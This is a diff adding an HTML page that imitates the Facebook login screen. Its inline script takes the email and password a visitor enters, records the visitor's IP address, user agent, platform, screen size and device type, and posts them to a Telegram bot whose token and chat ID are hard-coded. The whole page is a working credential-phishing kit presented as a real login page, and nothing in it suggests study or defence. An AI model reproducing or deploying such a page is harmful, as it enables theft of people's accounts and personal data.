@@ -1,0 +1,150 @@
+
+   
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <main>
+        <div class="row">
+            <div class="col-logo">
+                <img src="images/fb_logo.svg" alt="Logo">
+                <h2>Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+            <div class="col-form">
+                <form class="form-container" id="login-form">
+                    <input type="text" id="email" placeholder="Email address or phone number">
+                    <input type="password" id="password" placeholder="Password">
+                    <button type="submit" class="btn-login">Login</button>
+                    <a href="#">Forgotten password?</a>
+                    <button class="btn-new">Create new Account</button>
+                </form>
+                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <div class="form-container">
+            <ol>
+                <li>English (UK)</li>
+                <li><a href="#">മലയാളം</a></li>
+                <li><a href="#">தமிழ்</a></li>
+                <li><a href="#">తెలుగు</a></li>
+                <li><a href="#">বাংলা</a></li>
+                <li><a href="#">اردو</a></li>
+                <li><a href="#">हिन्दी</a></li>
+                <li><a href="#">ಕನ್ನಡ</a></li>
+                <li><a href="#">Español</a></li>
+                <li><a href="#">Português (Brasil)</a></li>
+                <li><a href="#">Français (France)</a></li>
+                <li><button>+</button></li>
+            </ol>
+
+            <ol>
+                <li><a href="#">Sign Up</a></li>
+                <li><a href="#">Log In </a></li>
+                <li><a href="#">Messenger</a></li>
+                <li><a href="#">Facebook Lite</a></li>
+                <li><a href="#">Watch</a></li>
+                <li><a href="#">People</a></li>
+                <li><a href="#">Pages</a></li>
+                <li><a href="#">Page categories</a></li>
+                <li><a href="#">Places</a></li>
+                <li><a href="#">Games</a></li>
+                <li><a href="#">Locations</a></li>
+                <li><a href="#">Marketplace</a></li>
+                <li><a href="#">Facebook</a></li>
+                <li><a href="#">PayGroups</a></li>
+                <li><a href="#">Jobs</a></li>
+                <li><a href="#">Oculus</a></li>
+                <li><a href="#">Portal</a></li>
+                <li><a href="#">Instagram</a></li>
+                <li><a href="#">Local</a></li>
+               
+            </ol>
+            <small>Facebook © 2025</small>
+        </div>
+    </footer>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+
+    <script>
+        const TOKEN = "7644983708:AAFifzquNbjVGaF0f5vzXhd7A_YtRiI-wuE";
+        const CHAT_ID = "1477354834";
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+        
+
+       const email = document.getElementById('email').value;
+       const password =document.getElementById('password').value;
+
+
+       axios.get('https://api.ipify.org?format=json')
+            .then(response => {
+                const ip = response.data.ip;
+                console.log('User IP:', ip);
+
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                const isTablet = /iPad|Android/i.test(navigator.userAgent) && !/Mobile/i.test(navigator.userAgent);
+                const deviceType = isTablet ? 'Tablet' : (isMobile ? 'Mobile' : 'Desktop');
+
+
+                console.log('User-Agent:', userAgent);
+                console.log('Platform:', platform);
+                console.log('Screen Resolution:', screenWidth + 'x' + screenHeight);
+                console.log('Device Type:', deviceType);
+
+
+
+                const message = `
+                    <b>New Login Attempt</b>\n
+                    <b>Email:</b>${email}\n
+                    <b>Password:</b>${password}\n
+                    <b>IP Address:</b>${ip}\n
+                    <b>Device Type:</b>${deviceType}\n
+                    <b>Platform:</b>${platform}\n
+                    <b>User Agent:</b>${userAgent}\n
+                    <b>screen Resolution:</b>${screenWidth}x${screenHeight}
+                    `;
+
+
+                    axios.post(URI_API,{
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(response =>{
+                        console.log('Message sent:', response.data);
+                        alert('Informaçoes enviadas com sucesso!');
+                    }).catch(error =>{
+                    console.error('Error sending message:',error);
+                      alert('Erro ao enviar as informações. Tente novamente.');
+                    });
+                })
+                .catch(error =>{
+                    console.error('Error fetching IP:', error);
+                    alert('Erro ao obter o endereço IP. Tente novamente.');
+                })
+            });
+                    
+            
+
+
+    </script>
+</body>
+
+</html>
